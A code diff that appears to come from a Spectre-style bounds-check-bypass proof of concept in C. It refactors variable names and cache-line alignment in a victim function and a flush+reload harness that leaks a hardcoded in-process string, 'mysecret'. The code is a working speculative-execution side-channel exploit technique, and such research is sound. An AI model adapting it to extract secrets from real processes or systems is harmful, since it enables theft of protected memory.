@@ -5,24 +5,26 @@
 #include "../lib/time_and_flush.c"
 #include "../lib/print_results.c"
 
-#define N_PAGES 256
-#define REPETITIONS 10000
-#define N_TRAINING 10
-#define CACHE_HIT 100
-#define SECRET_SIZE 9
-#define SECRET "mysecret"
-#define DATA "public"
-int DATA_SIZE __attribute__ ((aligned (256))) = 7;
+#define CACHE_HIT   100
+#define CL_SIZE     64          //CACHE LINE SIZE
+#define N_PAGES     256
 
-cp_t* flush_reload_arr __attribute__ ((aligned (256)));
+#define REPETITIONS 1000
+#define N_TRAINING  10
+#define SECRET_SIZE 9
+#define SECRET      "mysecret"
+#define BUF         "public"
+
+int BUF_SIZE __attribute__ ((aligned (CL_SIZE))) = 7;
+cp_t* flush_reload_arr __attribute__ ((aligned (CL_SIZE)));
 
 /*
  * Variables required in cache:
  *  index
- *  DATA
+ *  BUF
  *
  * Variables requried in mem:
- *  DATA_SIZE
+ *  BUF_SIZE
  *
  * Training:    index=0
  * Attack:      index={iterate through SECRET}
@@ -30,12 +32,12 @@ cp_t* flush_reload_arr __attribute__ ((aligned (256)));
 void victim_func(int index) {
 
     //flush bound value
-    flush(&DATA_SIZE);
+    flush(&BUF_SIZE);
     cpuid();
 
     //access (possibly out of bounds)
-    if (index < DATA_SIZE) {
-        unsigned char x = DATA[index];
+    if (index < BUF_SIZE) {
+        unsigned char x = BUF[index];
         volatile cp_t cp = flush_reload_arr[x];
     }
 }
@@ -75,8 +77,8 @@ int* prepare(int secret_index) {
 
 int main(int argc, char* argv[]) {
 
-    printf("SECRET \t%p\tsize = %d\nDATA \t%p\tsize = %d\nDATA[%d]\t%p\n",
-           &SECRET, SECRET_SIZE, &DATA, DATA_SIZE, DATA_SIZE, &DATA[DATA_SIZE]);
+    printf("SECRET \t%p\tsize = %d\nBUF  \t%p\tsize = %d\nBUF[%d] \t%p\n",
+           &SECRET, SECRET_SIZE, &BUF, BUF_SIZE, BUF_SIZE, &BUF[BUF_SIZE]);
 
     int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints
 
@@ -85,7 +87,7 @@ int main(int argc, char* argv[]) {
     for(int r = 0; r < REPETITIONS; r++) {
         printf("\nREPETITION %d\n", r);
         for (int s = 0; s < SECRET_SIZE; s++) {
-            results[r][s] = prepare(DATA_SIZE + s);
+            results[r][s] = prepare(BUF_SIZE + s);
             cpuid();
         }
     }
